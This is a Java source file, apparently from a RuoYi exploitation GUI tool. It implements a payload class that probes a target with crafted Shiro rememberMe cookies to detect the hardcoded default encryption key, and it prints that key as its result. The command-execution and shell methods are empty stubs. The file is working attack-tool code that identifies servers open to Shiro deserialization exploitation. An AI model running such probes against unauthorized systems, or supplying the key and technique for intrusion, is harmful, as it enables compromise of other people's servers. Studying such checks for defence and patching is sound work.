package com.ruoyi.ruoyigui.exploit;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.util.CustomHttpClient;

import java.util.Map;

public class ruoyi_shiro_default_key implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        CustomHttpClient req = new CustomHttpClient();
        Map<String, String> now_headers = CustomHttpClient.getGlobalHeaders();
        String key_encode = "5S3dK0sVQndXlh9fDpB8ip/Fn+8WmJfIyA0DEIWIdWk2EKgWhq8LpBG4bM2Pjv5TB3HgQA4B0CU1FYacqZx6n3lqdehm1l0JphRN5pe/6RjYquO9dVNBFstUrKCGN97YLs56Ye/rsvy+NosANitEZZ+r9wryl1XQkbI9Hbu3xgR2MQaWtxWRni3zQ6kipxMF";
        try {


            CustomHttpClient.setGlobalHeader("Cookie", "rememberMe=123");
            CustomHttpClient.HttpResponse res = req.get(url);
            if (String.valueOf(res.getHeaders()).contains("rememberMe")) {
                CustomHttpClient.clearGlobalHeaders();
                CustomHttpClient.setGlobalHeader("Cookie", "rememberMe=" + key_encode);
                CustomHttpClient.HttpResponse res1 = req.get(url);
                if (!String.valueOf(res1.getHeaders()).contains("rememberMe")) {
                    CustomHttpClient.clearGlobalHeaders();
                    CustomHttpClient.setGlobalHeaders(now_headers);
                    return new Result(true, "Ruoyi shiro默认key", "key:zSyK5Kp6PZAAjlT+eeNMlg==");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        CustomHttpClient.setGlobalHeaders(now_headers);
        return new Result(false, "Ruoyi shiro默认key", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        return new Result(false, null, null);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}
